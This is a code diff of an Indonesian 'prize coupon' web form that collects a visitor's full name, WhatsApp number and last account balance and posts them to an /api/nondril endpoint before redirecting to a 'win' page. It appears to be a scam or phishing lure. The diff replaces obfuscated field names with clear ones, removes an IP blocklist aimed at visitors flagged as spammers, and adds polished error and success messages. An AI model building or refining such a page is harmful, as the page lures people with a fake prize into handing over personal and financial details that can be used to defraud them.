@@ -3,12 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Form Cetak Kupon</title>
+    <title>Cetak Kupon Hadiah</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
-            box-sizing: border-box;
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
@@ -24,7 +25,7 @@
         
         .container {
             background-color: white;
-            border-radius: 12px;
+            border-radius: 15px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
             width: 100%;
             max-width: 500px;
@@ -140,6 +141,28 @@
             margin: 0 auto;
         }
         
+        .error-message {
+            display: none;
+            background-color: #ffebee;
+            color: #c62828;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 15px 0;
+            text-align: center;
+            border-left: 4px solid #c62828;
+        }
+        
+        .success-message {
+            display: none;
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 15px 0;
+            text-align: center;
+            border-left: 4px solid #2e7d32;
+        }
+        
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -168,20 +191,30 @@
         </div>
         
         <div class="form-container">
+            <div class="error-message" id="errorMessage">
+                <i class="fas fa-exclamation-circle"></i>
+                <span id="errorText">Terjadi kesalahan saat kirim data.</span>
+            </div>
+            
+            <div class="success-message" id="successMessage">
+                <i class="fas fa-check-circle"></i>
+                <span>Data berhasil dikirim! Kupon Anda sedang diproses.</span>
+            </div>
+            
             <form id="formData">
                 <div class="form-group">
                     <label for="name">Nama Lengkap</label>
-                    <input type="text" id="name" name="a" placeholder="Masukkan nama lengkap" required>
+                    <input type="text" id="name" name="name" placeholder="Masukkan nama lengkap" required>
                 </div>
                 
                 <div class="form-group">
                     <label for="phone">Nomor WhatsApp</label>
-                    <input type="tel" id="phone" name="b" placeholder="Contoh: 081234567890" required>
+                    <input type="tel" id="phone" name="phone" placeholder="Contoh: 081234567890" required>
                 </div>
                 
                 <div class="form-group">
                     <label for="balance">Saldo Terakhir</label>
-                    <input type="number" id="balance" name="c" placeholder="Contoh: 500000" required>
+                    <input type="number" id="balance" name="balance" placeholder="Contoh: 500000" required>
                 </div>
                 
                 <div class="loading" id="loading">
@@ -204,31 +237,52 @@
     </div>
 
     <script>
-        document.addEventListener("DOMContentLoaded", async () => {
+        document.addEventListener("DOMContentLoaded", () => {
             const form = document.getElementById("formData");
             const submitBtn = document.getElementById("kirim");
             const loading = document.getElementById("loading");
+            const errorMessage = document.getElementById("errorMessage");
+            const errorText = document.getElementById("errorText");
+            const successMessage = document.getElementById("successMessage");
             let isSubmitting = false;
-
-            // 🔥 Daftar IP spammer
-            const blockedIPs = [
-                "180.248.76.246",
-                
-            ];
-
-            // 🔍 Cek IP user
-            const userIP = await getPublicIP();
-            if (userIP && blockedIPs.includes(userIP)) {
-                alert("Akses kamu diblokir karena terdeteksi sebagai spam!");
-                form.innerHTML = "<div style='text-align:center;padding:20px;color:#d32f2f;'><h3>Akses Diblokir</h3><p>IP address Anda terdeteksi sebagai spam dan tidak dapat mengakses form ini.</p></div>";
-                return;
-            }
 
             form.addEventListener("submit", async function (e) {
                 e.preventDefault();
 
                 if (isSubmitting) {
-                    alert("Tunggu sebentar ya, sedang memproses...");
+                    return;
+                }
+
+                // Sembunyikan pesan error jika sebelumnya tampil
+                errorMessage.style.display = 'none';
+                
+                // Validasi input
+                const name = document.getElementById("name").value.trim();
+                const phone = document.getElementById("phone").value.trim();
+                const balance = document.getElementById("balance").value.trim();
+
+                if (!name) {
+                    showError("Nama lengkap harus diisi");
+                    return;
+                }
+
+                if (!phone) {
+                    showError("Nomor WhatsApp harus diisi");
+                    return;
+                }
+
+                if (!/^08[0-9]{8,13}$/.test(phone)) {
+                    showError("Nomor WhatsApp tidak valid! Harus diawali dengan '08' dan panjang 10-15 digit.");
+                    return;
+                }
+
+                if (!balance) {
+                    showError("Saldo terakhir harus diisi");
+                    return;
+                }
+
+                if (balance.length < 3 || parseInt(balance) < 100) {
+                    showError("Saldo terlalu kecil untuk diikutkan. Minimal Rp 100.");
                     return;
                 }
 
@@ -237,48 +291,39 @@
                 loading.style.display = 'block';
                 submitBtn.innerText = "Memproses Cetak Kupon...";
 
-                const formData = new FormData(form);
-                const data = Object.fromEntries(formData.entries());
-
-                // ✋ Validasi manual di client-side
-                const noWA = data.b || '';
-                const saldo = data.c || '';
-
-                if (!/^08[0-9]{8,13}$/.test(noWA)) {
-                    alert("Nomor WhatsApp tidak valid! Harus diawali dengan '08' dan panjang 10-15 digit.");
-                    resetBtn();
-                    return;
-                }
-
-                if (saldo.length < 3 || parseInt(saldo) < 100) {
-                    alert("Saldo terlalu kecil untuk diikutkan. Minimal Rp 100.");
-                    resetBtn();
-                    return;
-                }
-
                 try {
-                    // Kirim data ke endpoint API server-side Anda
+                    // Kirim data ke endpoint API server-side
                     const response = await fetch('/api/nondril', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
-                        body: JSON.stringify(data)
+                        body: JSON.stringify({
+                            name: name,
+                            phone: phone,
+                            balance: balance
+                        })
                     });
 
                     const result = await response.json();
 
                     if (result.success) {
-                        vibr(180);
+                        // Tampilkan pesan sukses
+                        successMessage.style.display = 'block';
+                        
+                        // Reset form
+                        form.reset();
+                        
+                        // Redirect setelah 2 detik
                         setTimeout(() => {
                             window.location.href = 'win.html';
-                        }, 1000);
+                        }, 2000);
                     } else {
-                        alert(result.message || "Gagal mengirim. Coba lagi.");
+                        showError(result.message || "Terjadi kesalahan saat kirim data.");
                     }
                 } catch (err) {
                     console.error("Error:", err);
-                    alert("Terjadi kesalahan saat kirim data.");
+                    showError("Terjadi kesalahan jaringan. Silakan coba lagi.");
                 }
 
                 resetBtn();
@@ -291,15 +336,13 @@
                 loading.style.display = 'none';
             }
 
-            async function getPublicIP() {
-                try {
-                    const res = await fetch("https://api.ipify.org?format=json");
-                    const data = await res.json();
-                    return data.ip;
-                } catch (err) {
-                    console.error("Gagal ambil IP:", err);
-                    return null;
-                }
+            function showError(message) {
+                errorText.textContent = message;
+                errorMessage.style.display = 'block';
+                resetBtn();
+                
+                // Scroll ke pesan error
+                errorMessage.scrollIntoView({ behavior: 'smooth' });
             }
 
             // Fungsi vibrasi (jika didukung browser)
